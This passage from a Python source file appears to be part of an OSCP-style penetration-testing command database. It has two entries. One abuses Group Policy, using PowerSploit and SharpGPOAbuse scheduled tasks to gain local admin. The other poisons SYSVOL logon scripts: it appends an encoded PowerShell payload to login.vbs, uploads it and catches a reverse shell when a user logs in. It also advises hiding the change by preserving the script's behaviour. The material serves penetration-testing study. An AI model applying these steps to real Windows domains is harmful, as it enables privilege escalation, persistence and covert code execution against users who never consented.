                        'tags': ['OSCP:HIGH', 'GPO_ABUSE', 'PRIVESC'],
                        'flag_explanations': {
                            'New-GPOImmediateTask': 'PowerSploit function to create GPO task',
                            '-TaskName': 'Scheduled task name',
                            '-Command': 'Command to execute (cmd, powershell)',
                            '-CommandArguments': 'Arguments for command',
                            '-GPODisplayName': 'Target GPO name',
                            '-Verbose': 'Show detailed output',
                            '-Force': 'Skip confirmation'
                        },
                        'success_indicators': [
                            'Task added to GPO successfully',
                            'Verify: Check GPO scheduled tasks in GPMC',
                            'Executes on next group policy refresh',
                            'User added to local admins on target'
                        ],
                        'failure_indicators': [
                            'Access denied - need WriteProperty on GPO',
                            'GPO not found',
                            'PowerSploit not loaded',
                            'Task creation failed'
                        ],
                        'next_steps': [
                            'Force policy update on target: gpupdate /force',
                            'Or wait ~90 minutes (default GP refresh)',
                            'Verify: net localgroup administrators',
                            'RDP/WinRM to target as admin'
                        ],
                        'alternatives': [
                            'SharpGPOAbuse: .\\SharpGPOAbuse.exe --AddComputerTask --GPOName "<gpo>"',
                            'Manual: GPMC → Edit GPO → Computer Config → Preferences → Control Panel → Scheduled Tasks',
                            'Registry autorun: Set-GPPrefRegistryValue for persistence'
                        ],
                        'notes': 'Immediate task = executes ASAP. Target all computers linked to GPO. Clean up task after exploitation'
                    }
                },
                # SYSVOL Logon Script Poisoning
                {
                    'id': 'sysvol-script-poison',
                    'name': 'SYSVOL Logon Script Poisoning',
                    'type': 'command',
                    'metadata': {
                        'command': f'smbclient \\\\\\\\{dc_ip}\\\\SYSVOL -U {username}',
                        'description': 'Poison logon scripts in SYSVOL (code execution on user login)',
                        'tags': ['OSCP:MEDIUM', 'GPO_ABUSE', 'CODE_EXEC'],
                        'flag_explanations': {
                            'smbclient': 'SMB client (Linux)',
                            '\\\\<dc>\\SYSVOL': 'SYSVOL share (GPO scripts)',
                            '-U': 'Username for authentication'
                        },
                        'success_indicators': [
                            'Connected to SYSVOL share',
                            'Can write to \\<domain>\\scripts\\ directory',
                            'Modified script executes on user login',
                            'Reverse shell or payload executed'
                        ],
                        'failure_indicators': [
                            'Access denied - SYSVOL read-only',
                            'Cannot find writable scripts',
                            'Script modification detected/blocked',
                            'No users have scriptPath set'
                        ],
                        'next_steps': [
                            'Find scripts: Get-DomainUser -Properties scriptPath | ?{$_.scriptPath}',
                            'Download original: get <domain>\\scripts\\login.vbs',
                            'Append payload: powershell -e <base64_shell>',
                            'Upload modified: put login.vbs <domain>\\scripts\\login.vbs',
                            'Wait for user login, catch reverse shell'
                        ],
                        'alternatives': [
                            'Windows: \\\\<dc>\\SYSVOL\\<domain>\\scripts\\',
                            'NetExec: netexec smb <dc> -u <user> -p <pass> -M spider_plus',
                            'Parse .lnk files: lnkparse login.vbs.lnk',
                            'NETLOGON share: \\\\<dc>\\NETLOGON\\ (same as SYSVOL\\<domain>\\scripts)'
                        ],
                        'notes': 'SYSVOL scripts = executed at user logon. Preserve original functionality. Clean up after use. Runs in user context (not SYSTEM)'
                    }
                }
            ]
        }
